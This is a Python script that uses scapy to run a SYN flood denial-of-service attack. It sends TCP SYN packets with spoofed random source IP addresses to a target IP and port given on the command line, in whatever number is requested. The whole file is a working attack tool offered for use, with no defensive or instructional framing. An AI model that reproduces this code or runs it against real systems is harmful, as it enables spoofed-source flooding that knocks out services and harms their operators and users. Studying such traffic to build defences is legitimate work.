from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser


def randomIP():
	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000, 9000)
	return x


def SYN_Flood(dstIP, dstPort, counter):
	total = 0
	print ("Packets are sending ...")

	for x in range (0, counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, inter=0.01, verbose=0)
		stdout.write("\nSent %i packets.\n" % total)
		total+=1

	stdout.write("\nTotal packets sent: %i\n" % total)


def main():
	parser = ArgumentParser()
	parser.add_argument('--target', '-t', help='target IP address')
	parser.add_argument('--port', '-p', help='target port number')
	parser.add_argument('--count', '-c', help='number of packets')
	parser.epilog = "Usage: python3 syn-flooding.py -t 10.20.30.40 -p 8080 -c 1"

	args = parser.parse_args()

	if args.target is not None:
		if args.port is not None:
			if args.count is None:
				print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
				SYN_Flood(args.target, args.port, 1)

			else:
				SYN_Flood(args.target, args.port, int(args.count))

		else:
			print('[-]Please, use --port/-p to give target\'s port!')
			print('[!]Example: -p 445')
			print('[?] -h for help')
			exit()
	else:
		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
                           [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target IP address
  --port PORT, -p PORT  target port number
  --count COUNT, -c COUNT
                        number of packets''')
		exit()

if __name__ == "__main__":
	main()